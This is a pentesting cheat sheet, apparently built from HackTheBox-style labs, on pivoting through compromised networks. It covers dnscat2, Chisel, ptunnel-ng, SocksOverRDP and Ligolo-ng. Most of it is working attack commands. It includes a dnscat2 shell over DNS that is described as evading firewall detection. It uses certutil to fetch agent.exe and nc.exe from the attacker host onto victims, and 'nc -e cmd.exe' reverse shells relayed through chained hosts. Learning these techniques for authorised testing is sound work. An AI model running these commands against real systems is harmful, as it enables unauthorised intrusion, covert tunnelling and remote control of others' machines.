## DNS Tunneling with Dnscat2
```bash
# Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts, evading firewall detections which strip the HTTPS connections and sniff the traffic. (https://github.com/iagox86/dnscat2)

## Starting the dnscat2 server on Attack host
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

## Cloning dnscat2-powershell and run it on the Windows target
git clone https://github.com/lukebaggett/dnscat2-powershell.git
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 

## Session Establishment on the  Attack Host
dnscat2> ? # help option
dnscat2> window -i 1 # drop a shell
```
## SOCKS5 Tunneling with Chisel
```bash
# Chisel can create a client-server tunnel connection in a firewall restricted environment.

# ATTACKER-> M1(10.129.202.64/172.16.X.X)-> M2(172.16.X.X) # dynamic port frw

## Normal mode 
  # on the pivot host (M1)
  ./chisel server -v -p 1234 --socks5

  # On Attacker Host 
  ./chisel client -v <M1-IP>:1234 socks #proxy: 127.0.0.1:1080=>socks: Listening
  
  tail -f /etc/proxychains.conf #=> socks5 127.0.0.1 1080
  proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 # pivoting work
--------------------------------------------------------------------------
## Reverse Mode (if blocks inbound connections)m (the best)
   ### on our Attack Host
   sudo ./chisel server --reverse -v -p 1234 --socks5

   ### Connecting the Chisel Client to our Attack Host
   ./chisel client -v <ATTACKER-IP>:1234 R:socks

   proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 # pivoting work
-----------------------------------------------------------------------
## local port forwarding for excute shell
./chisel server --reverse -p 1234 && nc -lvnp 8080    # attacker: start chisel server and listener
./chisel client <ATTACKER-IP>:1234 0.0.0.0:3333:<ATTCKER-IP>:8080  # M1
curl <M1-ip>:3333  # M2
--------------------------------------------------------------------------

# 🔁 Chisel Double Pivot 
# Kali
#  ├─ 127.0.0.1:1111 → M1 (R:1111:socks)
#  └─ 127.0.0.1:2222 → M2 (R:2222:127.0.0.1:2222)

# M1
# ├─ chisel server -p 4321 --reverse --socks5
# └─ client to Kali (R:1111 + forward 2222)

# M2
# └─ client to M1:4321 (R:2222:socks)

# Kali (Attacker)
./chisel server -p 1234 --reverse
# /etc/proxychains4.conf:
socks5 127.0.0.1 1111
socks5 127.0.0.1 2222

# M1
./chisel32 client <Kali-IP>:1234 R:1111:socks
./chisel32 server -p 4321 --reverse --socks5


# M2
./chisel32 client <M1-IP>:4321 R:2222:socks

# M1 
./chisel client <Attacker-IP>:1234 R:2222:127.0.0.1:2222

# Kali - Access M3
proxychains nmap -sT -p 22 <M3IP>
```

## ICMP Tunneling with SOCKS
```bash
# ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses, (https://github.com/utoni/ptunnel-ng.git)
Attacker(10.129.x.x:)=ICMP(SSH)=> M1 (10.129.x.x:22)=SSH=> M1 (localhost:22)
# setup tool with static binery
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh

# local port frw
  ## Starting the ptunnel-ng Server on the Target Host
  scp -r ptunnel-ng <M1-USER>@<M1-IP>:~/
  sudo ./ptunnel-ng -r<M1-IP> -R22

  ## Connecting to ptunnel-ng Server from Attack Host
  sudo ./ptunnel-ng -p<M1-IP> -l2222 -r<M1-ip> -R22

  ## On The Attack host Tunneling an SSH connection through an ICMP Tunnel
  ssh -p2222 -lubuntu 127.0.0.1

  ## enable Dynamic Port frw over ssh
  ssh -D 9050 -p2222 -lubuntu 127.0.0.1
  proxychains nmap -sV -sT 172.16.5.19 -p3389
```
##  RDP and SOCKS Tunneling with SocksOverRDP
```bash
# SocksOverRDP Pivoting via RDP (https://github.com/nccgroup/SocksOverRDP)

# SocksOverRDP uses Dynamic Virtual Channels (DVC) in the Windows RDP feature to tunnel arbitrary packets (e.g., SOCKS5 traffic) over an existing RDP connection.

#Pivot Chain:
ATTACKER (10.129.x.x) 
 └──RDP──> M1 (10.129.x.x / 172.16.x.x)
     └──RDP──> M2 (172.16.5.x / 172.16.6.x)
         └──RDP──> M3 (172.16.x.x)

# ON M1 (Initial Foothold):
  ## Step 1: Load the SocksOverRDP DLL (installs the plugin)
  regsvr32.exe SocksOverRDP-Plugin.dll # run as administrator 
  ## Step 2: Use mstsc.exe to RDP into M2 #=># This starts a SOCKS listener on: 127.0.0.1:1080
  
# On M2 (Next hop target):
  .\SocksOverRDP-Server.exe # Run with Admin privileges the SOCKS Server
# Back on M1 
  netstat -antb | findstr 1080 #=> Step 4: Verify SOCKS listener is active , Should show: 127.0.0.1:1080 LISTENING
  ## Step 5: Configure Proxifier AS Administrator to forward traffic to:
  127.0.0.1:1080 (SOCKS5) #  Guide GIF: https://academy.hackthebox.com/storage/modules/158/configuringproxifier.gif
  ## Step 6: Start mstsc.exe to connect to M3
  mstsc.exe # # Proxifier will route all traffic via 127.0.0.1:1080, tunneling through RDP to M2,  then to M3 via SocksOverRDP.

# RDP Performance Optimization (optional)
In mstsc.exe → "Experience" tab → set Performance = Modem
# This disables unnecessary graphics and improves tunnel performance
```

## logolo-ng 

```bash
#Pivoting with Ligolo-ng  
https://freedium.cfd/https://medium.com/@issam.qsous/mastering-multi-pivot-strategies-unleashing-ligolo-ngs-power-double-triple-and-even-quadruple-dca6b24c404c

- **Pivoting**: Use compromised systems to access otherwise unreachable networks.  
- **Tunnels**: Create secure connections to bypass network restrictions.  

## Ligolo-ng Overview  
- Establishes tunnels with **reverse TCP/TLS** using a tun interface (no need for SOCKS or proxychains).  
- Components:  
  - **Proxy**: Runs on your local machine to receive connections from compromised systems.  
  - **Agent**: Deployed on the target machine for command execution.  

## Key Options  

### Proxy Options:  
- `-laddr`: Listening address (default `0.0.0.0:11601`).  
- `-selfcert`: Generate self-signed certificates dynamically.  
- `-v`: Enable verbose mode.  

### Agent Options:  
- `-connect`: Target (domain:port).  
- `-retry`: Auto-retry on error.  
- `-socks`: SOCKS5 proxy settings (optional).  
- `-ignore-cert`: Ignore TLS certificate validation (for debugging only).  

## Lab Setup  
- Created 4 Virtual Networks with different **subnets**.  
- Configured **4 Windows VMs**, each connected to multiple subnets.  
- **Attacker Machine (Kali)** connected to `192.168.232.0`.  

### Subnet Connections  
1. **kali**: `192.168.232.153/24`  
2. **Ligolo-1**: `192.168.232.0` & `192.168.8.0`  
3. **Ligolo-2**: `192.168.119.0` & `192.168.8.0`  
4. **Ligolo-3**: `192.168.119.0` & `192.168.79.0`  
5. **Ligolo-4**: `192.168.21.0` & `192.168.79.0`  


### Ligolo-ng Pivoting Commands Cheat Sheet  

################################################
1. `Ligolo-1`: `192.168.232.133` & `192.168.8.129` 
################################################
#1.Upload Ligolo Agent on The Compromised Machine
`python -m http.server # on attcker machine`

`certutil.exe -urlcache -f "http://192.168.232.153:8000/agent.exe" agent.exe` #on Ligolo-1

#2.Setup Tun Interface on Kali:
`sudo ip tuntap add user "your-Kali-User" mode tun ligolo`  
`sudo ip link set ligolo up`  

#3.Start Ligolo Proxy on Kali:  
`./proxy --selfcert`  

#4.execute Ligolo Agent to Compromised Machine:  
`.\agent.exe -ignore-cert -connect 192.168.232.153:11601`  

#5.Interact with Sessions via Ligolo Proxy**:  
`session` #1 Ligolo-1 
`ifconfig` #192.168.8.129
`start` #establishing a connection between kai & Ligolo-1 

#6.Add Route to New Subnet on Kali**:  
`sudo ip route add 192.168.8.0/24 dev ligolo`  

#7.Ping the New Subnet:  
`ping 192.168.8.129` 

#8.Ping Sweep to Discover Hosts:  
for i in {1..254} ;do (ping -c 1 192.168.8.$i | grep "from" &) ;done 

#9.Execute Reverse Shell from Ligolo-2 to Kali:
###########################################
#=>(Found : Ligolo-2 Machine 192.168.8.130) 
#=> exploit RCE on Ligolo-2
##########################################

# [+] # upload netcat and establish a reverse shell on Ligolo-2
# [-] kali -----> Ligolo-2 # we  connect to kali from Ligolo-2
# [-] kali <-- X -- Ligolo-2 # we can't connect to kali from Ligolo-2

# To resolve this issue we need to set up a listener in Ligolo's proxy: Essentially, this listener will be responsible for forwarding traffic from port 8080 on the compromised machine to port 80 on our local Kali machine.

+------------------------------------------------------------+
| Compromised Machine (Ligolo-2)                             |
| IPs:  192.168.119.128  /  192.168.8.130                    |
|                                                            |
+------------------------------------------------------------+
                |
                | 192.168.8.129:8080
                v
+------------------------------------------------------------+
| Compromised Machine (Ligolo-1)                             |
| IPs: 192.168.232.133 / 192.168.8.129                       |
| [+] Logolo-ng Agent  & pivot machine                       |
+------------------------------------------------------------+
                |
                | (Traffic Forwarding)
                v
+------------------------------------------------------------+
| Ligolo Proxy Listener                                      |
| listener_add — addr 0.0.0.0:8080 — to 127.0.0.1:80 — tcp   |
+------------------------------------------------------------+
                |
                | (Traffic Received) 192.168.232.153:80
                v
+------------------------------------------------------------+
| Kali Machine                                                |
| IP: 192.168.232.153                                         |
| [+] Logolo-ng PROXY                                         |
+------------------------------------------------------------+

#Create Listener in Ligolo Proxy:  
`listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp` 

#upload Netcat to Ligolo-2 via Jump Host (Ligolo-1):
#Use Ligolo-1’s IP and port 8080 to transfer files.  
`python -m http.server -port 80` # on kali
`certutil.exe -urlcache -f "http://192.168.8.129:8080/nc.exe" nc.exe` #on Ligolo-2 

#Create a New Listener for Reverse Shell:  
#we will use the same technique from earlier we will create a new listener and execute Netcat along with the IP of the Ligolo-1 Machine(Jump Host) and the port we specify with the listener
`listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:444 --tcp`  

#Execute Reverse Shell from Ligolo-2 to Kali:
`nc -lnvp 444` # on kali 
`nc 192.168.8.129 4444 -e cmd.exe`  #on Ligolo-2(Use Ligolo-1 IP and configured port)
'++++++++++++++++++++++++++++++++++++++++++++++++'
successfully gaining access to Ligolo-2 machine |
'++++++++++++++++++++++++++++++++++++++++++++++++'
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#After gaining access to Ligolo-1 and Ligolo-2, the next step is to pivot and gain access to Ligolo-3, which is in the subnet `192.168.119.0/24`

#Now we need to utilize the Ligolo-2 Machine and make it a Jump Host for us to reach the Ligolo-3 Machine >>

################################################
2. `Ligolo-2`: `192.168.119.128` & `192.168.8.130` 
################################################

#1.Upload Ligolo Agent on The Compromised Machine
`python -m http.server -port 80 ` # on kali 
`certutil.exe -urlcache -f "http://192.168.8.129:8080/agent.exe" agent.exe` #on Ligolo-2 , upload agent to Ligolo-2 via Jump Host (Ligolo-1)

#2.Setup Tun Interface on Kali:
`sudo ip tuntap add user "your-Kali-User" mode tun ligolo-2`  
`sudo ip link set ligolo-2 up`

#4.execute Ligolo Agent to Compromised Machine:  
# To run Ligolo's Agent on the Ligolo-2 Machine, we'll adopt a strategy similar to the reverse shell. we must also create a new listener on Ligolo-1. This listener on Ligolo-1 will be essential for receiving the connection on our Ligolo proxy and ensuring the connection is established successfully.
`listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp` 
`.\agent.exe -ignore-cert -connect 192.168.8.129:11601` # on ligolo-2

#5.Interact with Sessions via Ligolo Proxy**:  
`session` #2 Ligolo-2 
`ifconfig` #192.168.119.128
`start --tun ligolo-2` #establishing a connection between kai & Ligolo-2 

#6.Add Route to New Subnet on Kali**:  
`sudo ip route add 192.168.119.0/24 dev ligolo-2`  

#7.Ping Sweep to Discover Hosts:  
for i in {1..254} ;do (ping -c 1 192.168.119.$i | grep "from" &) ;done 


#8.Execute Reverse Shell from Ligolo-2 to Kali:
###########################################
#=>(Found : Ligolo-3 Machine 192.168.119.129) 
#=> exploit RCE on Ligolo-3
##########################################

# [+] # upload netcat and establish a reverse shell on Ligolo-3
# [-] kali -----> Ligolo-3 # we  connect to kali from Ligolo-3
# [-] kali <-- X -- Ligolo-3 # we can't connect to kali from Ligolo-3

# To resolve this issue we need to set up a listener in Ligolo's proxy: Essentially, this listener will be responsible for forwarding traffic from port 8080 on the compromised machine to port 80 on our local Kali machine.

`listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp` # on ligolo-2
#upload Netcat to Ligolo-2 via Jump Host (Ligolo-1):
#Use Ligolo-1’s IP and port 8080 to transfer files.  
`python -m http.server -port 80` # on kali
`certutil.exe -urlcache -f "http://192.168.119.128:8080/nc.exe" nc.exe` #on Ligolo-3
#Create a New Listener for Reverse Shell:  
#we will use the same technique from earlier we will create a new listener and execute Netcat along with the IP of the Ligolo-1 Machine(Jump Host) and the port we specify with the listener
`listener_add --addr 0.0.0.0:9090 --to 127.0.0.1:999 --tcp`  

#Execute Reverse Shell from Ligolo-2 to Kali:
`nc -lnvp 999` # on kali 
`nc 192.168.119.128 9090 -e cmd.exe`  #on Ligolo-3(Use Ligolo-2 IP and configured port)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#Following the familiar pattern, we will create a new Ligolo interface and assume command access on the Ligolo-3 Machine. Using the same commands, we will establish a tunnel with Ligolo, execute the "start" command with the newly created Ligolo interface, and add a route to the new subnet (192.168.21.0). This systematic approach will allow us to extend our network access to the final machine in the 192.168.21.0 subnet.

#With our successful pivot into three subnets, we are now left with just one more subnet to access. This final subnet is associated with the last machine, which has an IP address of 192.168.21.0/24. Our objective is to extend our reach to this machine as well.

################################################
3. `Ligolo-3`: `192.168.119.129` & `192.168.79.128` 
################################################

#1.Upload Ligolo Agent on The Compromised Machine
`python -m http.server -port 80 ` # on kali 
`certutil.exe -urlcache -f "http://192.168.119.128:8080/agent.exe" agent.exe` #on Ligolo-3, upload agent to Ligolo-3 via Jump Host (Ligolo-2)

#2.Setup Tun Interface on Kali:
`sudo ip tuntap add user "your-Kali-User" mode tun ligolo-3`  
`sudo ip link set ligolo-3 up`  

#4.execute Ligolo Agent to Compromised Machine:  
# To run Ligolo's Agent on the Ligolo-3 Machine, we'll adopt a strategy similar to the reverse shell. we must also create a new listener on Ligolo-2. This listener on Ligolo-2 will be essential for receiving the connection on our Ligolo proxy and ensuring the connection is established successfully.
`listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp` 
`.\agent.exe -ignore-cert -connect 192.168.8.128:11601` # on ligolo-3

#5.Interact with Sessions via Ligolo Proxy**:  
`session` #3 Ligolo-3
`ifconfig` #192.168.79.128
`start --tun ligolo-3` #establishing a connection between kai & Ligolo-3

#6.Add Route to New Subnet on Kali**:  
`sudo ip route add 192.168.79.0/24 dev ligolo-3`  

#7.Add Route to New Subnet on Kali**:  
`sudo ip route add 192.168.79.0/24 dev ligolo-2`  

#8.Ping Sweep to Discover Hosts:  
for i in {1..254} ;do (ping -c 1 192.168.79.$i | grep "from" &) ;done 


```
